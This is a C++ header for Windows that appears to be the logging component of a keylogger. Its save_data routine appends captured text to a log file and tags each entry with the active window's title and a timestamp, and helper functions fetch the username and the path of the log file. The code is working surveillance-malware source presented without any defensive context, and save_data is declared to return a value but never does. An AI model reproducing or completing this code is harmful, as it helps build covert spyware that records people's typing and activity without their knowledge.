#ifndef BUFFER_H
#define BUFFER_H

/*****************************************include*******************************************/
#include "windows.h"
#include <ctime> 
#include <iostream>
#include <fstream>
#include <string>
#include <Lmcons.h>

using namespace std;

/************************************** Declarations ****************************************/

struct 										lBuffer
	{
		private:
		
			HWND 							lastWindow;	

		public:

			string 							BufferPath;	

			int 							save_data(string s);

			string 							GetTime();

			string     						GetUsername();

			BOOL 							CheckBufferExist();

			BOOL 							CheckFileExists(const string &f);

			string 							GetBufferPath();

	}Buffer;
	lBuffer *buffer = &Buffer;

/********************************************************************************************/

int 										lBuffer::save_data(string s)
		{
			ofstream logFile(BufferPath.c_str() ,std::ios::out | std::ios::app); //<------


			char        title[256];
	        HWND        currentWindow = GetForegroundWindow();
	        if (currentWindow != lastWindow)
	        {
	            GetWindowText(currentWindow, title, sizeof(title));

	            lastWindow = currentWindow;
	            logFile << "\n[Window:] "<< title<<" - [at] ";
	            logFile	<<GetTime()<< "\n	";
	        }
			

			logFile << s ;
			logFile.flush();
			logFile.close();
		}

BOOL 										lBuffer::CheckBufferExist()
	{
		if(!CheckFileExists(BufferPath.c_str()))
		{// if no exist
			return false;
		}
		else
		{// if exist
			return true;
		}
	}

BOOL 										lBuffer::CheckFileExists(const string &f)
    {
        ifstream file(f);
        return (bool)file; 
    }	

string 										lBuffer::GetBufferPath()
	{
		return BufferPath;
	}

string 										lBuffer::GetTime()
	{
	    time_t rawtime;
	    time ( &rawtime );
	    std::string str = ctime(&rawtime);
	    return str;
	}

string     									lBuffer::GetUsername()
	{			
	   char         username[UNLEN + 1];
	   DWORD        usernameLen = sizeof(username);

	   GetUserName(username, &usernameLen);
	   return (username);
	}

/*********************************************************************************************/
#endif